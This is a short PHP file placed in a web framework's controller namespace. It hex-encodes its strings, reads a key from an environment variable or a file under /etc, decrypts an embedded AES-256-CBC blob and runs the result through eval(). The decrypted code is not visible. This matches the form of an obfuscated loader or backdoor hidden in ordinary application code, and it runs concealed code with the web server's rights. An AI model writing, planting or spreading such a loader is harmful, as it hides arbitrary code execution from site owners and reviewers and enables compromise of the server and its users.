<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('VoOCX/83Arx6RdHwD+6UrA==');

$c=base64_decode(

'6QUVsXeYZxHTTP+PfuL1aKc3eQfHiV/SRYHxj8zqLD9/43WCMQ19hUtcqGwo409XDggrZCvCJaMt' .
'7wsKpseeZMpf+K1tW3ELcwGKLSd6ex9LMLpnX3tHzw2GBGtcoL+TjYiDvN3J/lZdC1JXruyygSDU' .
'm+Z85e+fEchwyk4Nf3AKyjlmdAbUw1BIhpmqVCHzYLy3cIHe22OaMB1bxURqP+o1l3/VOXG+qF1w' .
'PKiP0QRqgYitlcKbmSe8FN/Y7ENTEExjzD59rFJ/dwgLjY8BeiT6IGIBPqSBde1Jndi0Rog='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

